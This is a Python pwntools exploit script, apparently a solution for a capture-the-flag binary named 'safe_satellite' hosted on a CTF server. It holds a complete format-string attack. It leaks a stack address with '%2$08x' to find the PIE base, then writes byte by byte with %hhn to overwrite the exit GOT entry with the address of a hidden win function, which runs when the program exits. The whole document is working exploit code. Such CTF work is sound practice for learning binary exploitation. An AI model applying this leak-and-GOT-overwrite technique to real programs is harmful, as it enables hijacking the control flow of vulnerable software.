#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./safe_satellite", checksec=False)
context.arch = "i386"

HOST = "zlcf0m425j5v.boroctf.com"
PORT = 31673

BIN = context.binary
WIN_OFF = BIN.sym["emergency_orbit_realignment"]
EXIT_GOT_OFF = BIN.got["exit"]
LEAK_RET_OFF = BIN.sym["write_log"] + 0x0F


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(["bash", "-lc", "./safe_satellite"], cwd=".")


def menu(io, choice):
    io.sendlineafter(b"> ", choice)


def write_log(io, payload):
    menu(io, b"Write log")
    io.sendlineafter(b"> ", payload)


def print_logs(io):
    menu(io, b"Print logs")


def build_leak_payload():
    leak_fmt = b"%2$08x"
    first_card = b"COMMENT" + leak_fmt + b"A" * (80 - 7 - 8)
    return first_card + b"END"


def build_write_payload(exit_got, win):
    target_bytes = [
        (exit_got + 0, win & 0xFF),
        (exit_got + 1, (win >> 8) & 0xFF),
        (exit_got + 2, (win >> 16) & 0xFF),
        (exit_got + 3, (win >> 24) & 0xFF),
    ]
    target_bytes.sort(key=lambda item: item[1])

    payload = b"A" + b"".join(p32(addr) for addr, _ in target_bytes)
    written = len(payload)

    for idx, (_, value) in enumerate(target_bytes, start=6):
        pad = (value - written) % 0x100
        if pad:
            payload += f"%1${pad}c".encode()
            written = (written + pad) % 0x100
        payload += f"%{idx}$hhn".encode()
    return payload


def leak_base(io):
    write_log(io, build_leak_payload())
    print_logs(io)
    io.recvuntil(b"COMMENT")
    leak = int(io.recvn(8), 16)
    base = leak - LEAK_RET_OFF
    log.info(f"leak = {hex(leak)}")
    log.info(f"pie base = {hex(base)}")
    return base


def main():
    io = start()
    base = leak_base(io)

    exit_got = base + EXIT_GOT_OFF
    win = base + WIN_OFF
    log.info(f"exit@got = {hex(exit_got)}")
    log.info(f"win = {hex(win)}")

    write_log(io, build_write_payload(exit_got, win))
    write_log(io, b"TRIGGER SPACE")
    menu(io, b"Exit safely")

    data = io.recvall(timeout=3)
    print(data.decode("latin-1", errors="ignore"))


if __name__ == "__main__":
    main()
